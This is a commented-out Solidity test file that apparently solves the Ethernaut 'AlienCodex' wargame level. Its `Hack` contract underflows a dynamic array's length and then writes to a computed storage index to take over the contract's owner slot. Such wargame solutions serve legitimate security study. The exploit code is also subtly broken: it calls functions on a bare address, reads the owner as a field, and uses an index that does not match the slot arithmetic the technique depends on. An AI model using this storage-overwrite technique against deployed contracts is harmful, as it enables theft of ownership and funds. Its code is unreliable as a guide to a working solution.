// // SPDX-License-Identifier: MIT
// pragma solidity 0.5.0;
// pragma experimental ABIEncoderV2;

// import "../src/levels/AlienCodex.sol";
// import "../src/levels/AlienCodexFactory.sol";
// import "./utils/BaseTest.sol";

// contract TestAlienCodex is BaseTest{
//     AlienCodex level;


//     constructor() public{
//         levelFactory = new AlienCodexFactory();
//     }

//     function setUp() public override{
//         super.setUp();
//     }
//     function testRunLevel() public{
//         runLevel();
//     }
//    function setupLevel() internal override{
//         levelAddress = payable(this.createLevelInstance(true));
//         level = AlienCodex(levelAddress);
                
//     }

//     function exploitLevel() internal override{
//         vm.prank(player, player);
//         new Hack(address(level));
//         assertEq(level._owner, player);
//         vm.stopPrank();
//     }
// }

// contract Hack {
//     constructor(address _target){
//         _target.makeContact();
//         _target.retract();

//         _target.revise(2**256 - 2 , bytes32(uint256(uint160(msg.sender))));
//     }
// }